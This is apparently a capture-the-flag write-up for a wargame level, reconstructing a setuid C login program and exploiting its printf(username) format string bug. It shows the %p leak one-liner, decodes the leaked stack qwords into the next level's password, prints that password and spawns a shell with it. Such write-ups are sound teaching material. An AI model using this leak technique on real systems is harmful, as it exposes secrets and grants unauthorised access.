# Level02

## Reconstructed source

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void)
{
    char username[112];       // [rbp-0x70]
    char real_pass[48];       // [rbp-0xa0] - holds level03's real .pass
    char password[272];       // [rbp-0x110]
    FILE *fp;
    int  n;

    fp = fopen("/home/users/level03/.pass", "r");   // binary is setuid level03
    if (fp == NULL)
    {
        fwrite("ERROR: failed to open password file\n", 1, 0x24, stderr);
        exit(1);
    }
    n = fread(real_pass, 1, 0x29, fp);              // 41 bytes of the pass onto the stack
    real_pass[strcspn(real_pass, "\n")] = 0;
    if (n != 0x29)
    {
        fwrite("ERROR: failed to read password file\n", 1, 0x24, stderr);
        exit(1);
    }
    fclose(fp);

    puts("===== [ Secure Access System v1.0 ] =====");
    puts("/***************************************\\");
    puts("| You must login to access this system. |");
    puts("\\**************************************/");

    printf("--[ Username: ");
    fgets(username, 0x64, stdin);
    username[strcspn(username, "\n")] = 0;

    printf("--[ Password: ");
    fgets(password, 0x64, stdin);
    password[strcspn(password, "\n")] = 0;

    puts("*****************************************");

    if (strncmp(real_pass, password, 0x29) == 0)
    {
        printf("Greetings, %s!\n", username);
        system("/bin/sh");
        return (0);
    }
    printf(username);                                // format string bug
    puts(" does not have access!");
    exit(1);
}
```

Playing legitimately is impossible: the login requires level03's password, which
lives in `/home/users/level03/.pass`. level02 cannot read that file, but the
binary is setuid level03, so it reads the password for us and places it on the
stack in `real_pass`. The `strncmp` therefore always fails for us.

## Vulnerability

On the failure branch the program runs:

```c
printf(username);     // NOT printf("%s", username)
```

The user-controlled `username` is used as the **format string** of `printf`.
This is a **format string vulnerability**. With format specifiers like `%p` in
the username, `printf` believes arguments were passed and reads them from the
registers and the stack, printing memory the user should never see.

Crucially, `real_pass` (the real level03 password, 41 bytes) was just loaded by
`fread` onto the stack. So `%p` specifiers in the username leak it directly; no
shell or overflow is needed to obtain the flag.

## Exploitation

### Step 1 - leak the stack

Send `%p` specifiers as the username and any wrong password to reach the
`printf(username)` branch:

```sh
python -c 'print "%p "*30 + "\nX"' | ./level02
```

Output (trimmed):

```
... (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 \
0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 ...
```

On x86-64 the first variadic values come from registers (`rsi, rdx, rcx, r8,
r9`), so the stack is only reached from the 6th `%p` onward.

### Step 2 - identify the password qwords

The password is 5 contiguous qwords (5 * 8 = 40 bytes = pass length) where every
byte is printable ASCII (`0x30`-`0x7a`), framed by `(nil)` buffer boundaries.
Addresses (`0x7fff...`), small integers (`0x58`, `(nil)`) and the repeated
banner (`0x2a2a...` = `****`) are ignored.

### Step 3 - decode (little-endian)

Each qword is stored byte-reversed, so split into bytes, reverse, read as ASCII:

```
0x756e505234376848 -> 48 68 37 34 52 50 6e 75 -> "Hh74RPnu"
0x45414a3561733951 -> "Q9sa5JAE"
0x377a7143574e6758 -> "XgNWCqz7"
0x354a35686e475873 -> "sXGnh5J5"
0x48336750664b394d -> "M9KfPg3H"
```

Concatenated: `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

### Step 4 - confirm with a shell

Feed the recovered string as the password; `strncmp` now matches and the program
spawns a shell as level03:

```sh
(python -c "print 'x\nHh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H'"; cat) | ./level02
# Greetings, x!
whoami                              # level03
cat /home/users/level03/.pass      # Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

